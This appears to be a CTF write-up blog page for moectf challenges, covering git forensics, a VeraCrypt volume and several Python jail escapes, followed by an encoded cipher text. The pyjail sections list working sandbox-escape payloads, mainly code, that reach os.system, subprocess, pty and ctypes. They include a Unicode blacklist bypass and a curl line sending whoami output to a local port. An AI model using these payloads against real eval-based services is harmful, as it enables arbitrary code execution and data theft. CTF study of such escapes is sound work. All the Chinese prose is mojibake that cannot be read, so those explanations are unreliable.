<h3 id="13-WebRepo"><a href="#13-WebRepo" class="headerlink" title="13.WebRepo"></a>13.<strong>WebRepo</strong></h3><p>æ‰«ç ,å¾—åˆ°æç¤º</p>
<p><img src="D:\typora_pic\46580d66ba2a82ff87f299d4bc4ddba0_720.png" alt="46580d66ba2a82ff87f299d4bc4ddba0_720"></p>
<p>ç”¨binwalkæ£€æµ‹å‡º</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# binwalk --run-as=root 1.zip                                              </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">16012         0x3E8C          7-zip archive data, version 0.3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨ä»¥ä¸‹å‘½ä»¤æå–</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=1.zip of=repo.7z bs=1 skip=16012</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250823140730622.png" alt="image-20250823140730622"></p>
<p>å‘ç°æœ‰flag.txt,ä¸”è¿™ä¸ªæ–‡ä»¶å¤¹å…¶å®å°±æ˜¯.gitæ–‡ä»¶,ç›´æ¥ä»æäº¤é‡Œå¯¼å‡ºflag.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=oneline -- flag.txt //249ff41401736165cd4514cee7afcd31ecfe7d09</span><br><span class="line">git show &lt;æäº¤å“ˆå¸Œ&gt;:flag.txt &gt; flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250823140946052.png" alt="image-20250823140946052"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-Encrypted-volume"><a href="#14-Encrypted-volume" class="headerlink" title="14.Encrypted volume"></a>14.<strong>Encrypted volume</strong></h3><p>ä»é¢˜ç›®å’Œæç¤ºçŒœæµ‹å’Œveracryptæœ‰å…³.å°†é™„ä»¶ç”¨binwalkåˆ†ç¦»å‡ºä¸€å¼ äºŒç»´ç </p>
<p><img src="D:\typora_pic\hidden.png" alt="hidden"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:@(s&lt;&quot;A3F:89x541Ux[&lt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæœ‰ä¸€ä¸ªvolumeæ–‡ä»¶,æˆ‘ä»¬ç”¨ä¸Šé¢çš„å·¥å…·æŒ‚è½½ä¸‹æ¥</p>
<p><img src="D:\typora_pic\image-20250824011337699.png" alt="image-20250824011337699"></p>
<p>å¾—åˆ°brainfuck.txtï¼Œè§£å¯†å³å¯</p>
<p><img src="D:\typora_pic\image-20250824011458606.png" alt="image-20250824011458606"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125;</span><br></pre></td></tr></table></figure>

<h3 id="15-pyjail0"><a href="#15-pyjail0" class="headerlink" title="15.pyjail0"></a>15.pyjail0</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.243.1 54227</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŒ‰ç…§è¦æ±‚å³å¯,flagåœ¨&#x2F;proc&#x2F;self&#x2F;environ</p>
<p><img src="D:\typora_pic\image-20250907151003455.png" alt="image-20250907151003455"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;a8b61373-b10d-c71a-b109-041b45320746&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-Pyjail-1"><a href="#16-Pyjail-1" class="headerlink" title="16.Pyjail 1"></a>16.<strong>Pyjail 1</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;Give me your code: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿‡æ»¤å…³é”®å­—</span></span><br><span class="line">    forbidden_keywords = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords:</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> user_input:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Forbidden keyword detected: <span class="subst">&#123;keyword&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    result = <span class="built_in">eval</span>(user_input)</span><br></pre></td></tr></table></figure>

<p>éœ€è¦è¿›è¡Œæ²™ç®±é€ƒé€¸å‚è€ƒæ–‡æ¡£:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/N1ng/p/18491520">https://www.cnblogs.com/N1ng/p/18491520</a></p>
<p>å°è¯•ç”¨help()æ— æ³•ç»•è¿‡</p>
<p>é»‘åå•å¯ä»¥ç”¨unicodeç¼–ç ç»•è¿‡,ç½‘ä¸Šæ‰¾çš„è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicodedata <span class="keyword">import</span> normalize</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">lst = <span class="built_in">list</span>(ascii_lowercase)</span><br><span class="line">dic = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x110000</span>):</span><br><span class="line">        <span class="keyword">if</span> normalize(<span class="string">&quot;NFKC&quot;</span>, <span class="built_in">chr</span>(i)) == char:</span><br><span class="line">            dic[char].append(<span class="built_in">chr</span>(i))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(dic[char]) &gt; <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğ“®val(inpğ“¾t())</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥ä¹‹åè¿›å…¥äº¤äº’çŠ¶æ€,ä¹‹åå³å¯é€ƒé€¸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;cat /tmp/f*&#x27;)</span><br></pre></td></tr></table></figure>



<p><img src="D:\typora_pic\image-20250907201208507.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;1abe3a6d-4e4e-2cf4-7b0a-4ccfd7cb8a6b&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ğ“®val(inpğ“¾t())</span><br><span class="line"></span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;cat /tmp/f*&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="17-Pyjail-2"><a href="#17-Pyjail-2" class="headerlink" title="17.Pyjail 2"></a>17.Pyjail 2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;Give me your code: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿‡æ»¤å…³é”®å­—</span></span><br><span class="line">    forbidden_keywords = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords:</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> user_input:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Forbidden keyword detected: <span class="subst">&#123;keyword&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦</span></span><br><span class="line">    forbidden_chars = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> forbidden_chars:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> user_input:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Forbidden character detected: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">eval</span>(user_input)</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°æµ‹è¯•å‘ç°ä¸Šä¸€é¢˜çš„payloadå¯ä»¥ç»§ç»­æ‰“</p>
<p><img src="D:\typora_pic\image-20250907201821971.png" alt="image-20250907201821971"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;74642fb3-4cea-91a2-ffb3-50f2c35302b6&#125;</span><br></pre></td></tr></table></figure>

<h3 id="17-pyjail-3"><a href="#17-pyjail-3" class="headerlink" title="17.pyjail 3"></a>17.pyjail 3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;Give me your code: &quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(user_input, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;, &#123;&#125;)</span><br><span class="line">        <span class="comment"># Hint: When __builtins__ is None, you need to be more creative...</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Code executed successfully!&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Return value: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Execution error: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç›´æ¥æ¸…ç©ºäº†æ‰€æœ‰builtinsé‡Œçš„å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># os</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;cat /tmp/f*&quot;)</span><br><span class="line"></span><br><span class="line"># subprocess </span><br><span class="line">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line"># builtins</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]</span><br><span class="line"></span><br><span class="line"># help</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]</span><br><span class="line"></span><br><span class="line">#sys</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#commands (not very common)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#pty (not very common)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#importlib</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#imp</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#pdb</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line"># ctypes</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())</span><br><span class="line"></span><br><span class="line"># multiprocessing</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯æˆ‘ä»<a target="_blank" rel="noopener" href="https://blog.lightwing.top/2025/01/12/python_jail_escape/#%E4%B8%8A%E8%BF%B0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E6%96%B9%E5%BC%8F%E6%89%BE%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E9%93%BE%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8%E7%9A%84payload,%E4%BB%A5%E7%AC%AC%E4%B8%80%E6%9D%A1%E4%B8%BA%E4%BE%8B%E8%A7%A3%E9%87%8A">https://blog.lightwing.top/2025/01/12/python_jail_escape/#%E4%B8%8A%E8%BF%B0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E6%96%B9%E5%BC%8Fæ‰¾åˆ°çš„ä¸€äº›é€šè¿‡ç»§æ‰¿é“¾çš„æ–¹å¼è¿›è¡Œé€ƒé€¸çš„payload,ä»¥ç¬¬ä¸€æ¡ä¸ºä¾‹è§£é‡Š</a></p>
<p>åˆ†æ­¥æ‹†è§£:</p>
<ol>
<li><strong><code>&#39;&#39;.__class__</code></strong><ul>
<li>ç©ºå­—ç¬¦ä¸² <code>&#39;&#39;</code> çš„ç±»å°±æ˜¯ <code>str</code>ã€‚</li>
<li>æ‰€ä»¥ <code>&#39;&#39;.__class__ == str</code>ã€‚</li>
</ul>
</li>
<li><strong><code>.__base__</code></strong><ul>
<li><code>str</code> ç»§æ‰¿è‡ª <code>object</code>ã€‚</li>
<li>æ‰€ä»¥ <code>&#39;&#39;.__class__.__base__ == object</code>ã€‚</li>
</ul>
</li>
<li><strong><code>.__subclasses__()</code></strong><ul>
<li><code>object.__subclasses__()</code> ä¼šè¿”å›å½“å‰æ‰€æœ‰ <strong><code>object</code> çš„å­ç±»</strong>ï¼Œä¹Ÿå°±æ˜¯ Python è¿è¡Œç¯å¢ƒä¸­åŠ è½½çš„æ‰€æœ‰ç±»å¯¹è±¡ã€‚</li>
<li>è¿™åŒ…å«äº†å¾ˆå¤šæ ‡å‡†åº“çš„ç±»ï¼Œæ¯”å¦‚ <code>type</code>, <code>tuple</code>, <code>list</code>, <code>_wrap_close</code> ç­‰ã€‚</li>
</ul>
</li>
<li><strong><code>if x.__name__==&quot;_wrap_close&quot;</code></strong><ul>
<li>éå† <code>object.__subclasses__()</code> è¿”å›çš„æ‰€æœ‰ç±»ï¼Œç­›é€‰å‡ºåå­—å« <code>&quot;_wrap_close&quot;</code> çš„ç±»ã€‚</li>
<li><code>_wrap_close</code> æ˜¯ Python åœ¨å¤„ç† I&#x2F;O æ—¶ç”¨çš„ä¸€ä¸ªå†…éƒ¨ç±»ã€‚</li>
</ul>
</li>
<li><strong><code>x.__init__.__globals__</code></strong><ul>
<li>å– <code>_wrap_close</code> ç±»çš„ <code>__init__</code> æ–¹æ³•ã€‚</li>
<li>æ¯ä¸ªå‡½æ•°å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <code>__globals__</code> å±æ€§ï¼ŒæŒ‡å‘å®šä¹‰å®ƒæ—¶æ‰€åœ¨çš„å…¨å±€å˜é‡å­—å…¸ï¼ˆä¹Ÿå°±æ˜¯ä¸€æ•´ä¸ª Python å…¨å±€å‘½åç©ºé—´ï¼‰ã€‚</li>
<li>åœ¨è¿™ä¸ªå­—å…¸é‡Œï¼Œå¯ä»¥æ‰¾åˆ°å†…ç½®å‡½æ•°ã€æ¨¡å—ç­‰ï¼ŒåŒ…æ‹¬ <code>system</code>ã€‚</li>
</ul>
</li>
<li><strong><code>[ ... ][0]</code></strong><ul>
<li>å‰é¢ç”¨åˆ—è¡¨æ¨å¯¼å¼æ‰¾åˆ°äº†ç›®æ ‡ç±»ï¼ŒæŠŠå®ƒä»¬çš„ <code>__globals__</code> æ”¶é›†åˆ°åˆ—è¡¨ä¸­ã€‚</li>
<li>å–ç¬¬ä¸€ä¸ª <code>[0]</code>ã€‚</li>
</ul>
</li>
<li><strong><code>[&quot;system&quot;]</code></strong><ul>
<li>ä»å…¨å±€å­—å…¸é‡Œæ‹¿åˆ°é”® <code>&quot;system&quot;</code> å¯¹åº”çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ <code>os.system</code>ã€‚</li>
</ul>
</li>
<li><strong><code>(&quot;cat /tmp/f\*&quot;)</code></strong><ul>
<li>è°ƒç”¨ <code>os.system(&quot;cat /tmp/f*&quot;)</code>ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒæŠŠ <code>/tmp</code> ç›®å½•ä¸‹ä»¥ <code>f</code> å¼€å¤´çš„æ–‡ä»¶æ‰“å°å‡ºæ¥ã€‚</li>
</ul>
</li>
</ol>
<p><img src="D:\typora_pic\image-20250907210356136.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;4ef3e96b-f34a-0bc3-5174-8e702603a155&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-å“ˆåŸºç±³è¯­"><a href="#18-å“ˆåŸºç±³è¯­" class="headerlink" title="18.å“ˆåŸºç±³è¯­"></a>18.å“ˆåŸºç±³è¯­</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›æ¬§è«å­£é‡Œå™¶å¥ˆå“ªä¹°å™¶å¥ˆå“¦å—å‰åˆ©ã€‚å“¦å—å‰åˆ©å“ªä¹°å™¶å¥ˆå“ªæ¤°å¥¶é¾™ï¼Ÿå“ˆåŸºç±³ä¹°å¨œå¥ˆå“ªä¹°åŒ—çªé‚£æ²¡æ’¸å¤šã€‚å“ˆåŸºç±³å¤šå¤šå‹é‚£å¥ˆæ¤°å¥¶é¾™ï¼›å¥ˆè¯ºå¨œç¾å˜å“ªä¹°å¨œå¥ˆå“ªä¹°çªé‚£æ²¡æ’¸å¤šï¼Ÿå“¦å—å‰åˆ©å™¶å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ã€‚åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ï¼Œå“ˆåŸºç±³å¨œå¥ˆå“ªä¹°åŒ—å—åŒ—ç»¿è±†ï¼Œå“¦å—å‰åˆ©å¤šå¤šå‹é‚£å¤šå¤šæ¬§è«å­£é‡Œã€‚é˜¿è¥¿å™¶å‹å‹é‚£å—æ’¸åŸºé˜¿å¥ˆè¯ºå¨œç¾å˜ï¼Œå“ˆåŸºç±³å—é‡Œå—åŒ—å‹é‡Œçªé‚£æ²¡æ’¸å¤šã€‚åº“è·¯æ›¼æ³¢ä¸€å‰è±†æ²¡å’•æ¤°å¥¶é¾™ï¼Œåº“è·¯æ›¼æ³¢å‰è±†æ²¡å’•å‰è±†æ¤°å¥¶é¾™ã€‚åº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†æ²¡å’•åº“è·¯æ›¼æ³¢ï¼Ÿå“¦å—å‰åˆ©å‰è±†æ²¡ç±³å‰åº“è·¯æ›¼æ³¢ã€‚é˜¿è¥¿å™¶å‹è±†è€¶å’•å‰è±†æ²¡ç±³çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†å‰è±†æ²¡ç±³å“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå‰è±†æ²¡å’•å‰å¥ˆè¯ºå¨œç¾å˜ã€‚åº“è·¯æ›¼æ³¢è±†æ²¡å’•å‰è±†æ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œæ²¡å’•å‰è±†æ²¡å’•å‰å—åŒ—ç»¿è±†ï¼Ÿåº“è·¯æ›¼æ³¢è±†æ²¡ç±³å‰è±†æ¬§è«å­£é‡Œã€‚å“¦å—å‰åˆ©è€¶å’•å‰è±†æ²¡å’•å¥¶å“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå‹å¤šé‚£å‰è±†æ²¡å’•å¥ˆè¯ºå¨œç¾å˜ã€‚é˜¿è¥¿å™¶å‹å‰è±†æ²¡å’•å‰å“¦å—å‰åˆ©ï¼›æ¤°å¥¶é¾™è±†æ²¡å’•å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ã€‚çªé‚£æ²¡æ’¸å¤šå‰è±†æ²¡ç±³å¥¶å‹å“ˆåŸºç±³ï¼Œå“ˆåŸºç±³å¤šé‚£å‰è±†æ²¡ç±³å‰å“ˆåŸºç±³ï¼Ÿå¥ˆè¯ºå¨œç¾å˜è±†æ²¡å’•å‰è±†çªé‚£æ²¡æ’¸å¤šï¼Œå—åŒ—ç»¿è±†æ²¡å’•å‰è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šï¼Œçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰å“¦å—å‰åˆ©ï¼›å—åŒ—ç»¿è±†è±†æ²¡å’•å‰è±†æ²¡ç±³çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†å‰è±†è€¶å’•å‰è±†æ¤°å¥¶é¾™ã€‚å“ˆåŸºç±³æ²¡ç±³å‰è±†å“ˆåŸºç±³ï¼Ÿåº“è·¯æ›¼æ³¢è€¶å—å¤šå¥ˆå“ªä¹°å™¶å“ˆåŸºç±³ã€‚å“¦å—å‰åˆ©å¥ˆå“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼›å—åŒ—ç»¿è±†ä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šï¼›é˜¿è¥¿å™¶å‹ä¹°å™¶å¥ˆå“ªä¹°é˜¿è¥¿å™¶å‹ï¼›å“ˆåŸºç±³å¨œå¤šå¤šå‹é‚£çªé‚£æ²¡æ’¸å¤šï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°åŒ—å¤šå¥ˆè¯ºå¨œç¾å˜ï¼›å“¦å—å‰åˆ©å¤šå‹é‚£å‘€é‡Œæ¬§è¥¿åº“è·¯æ›¼æ³¢ã€‚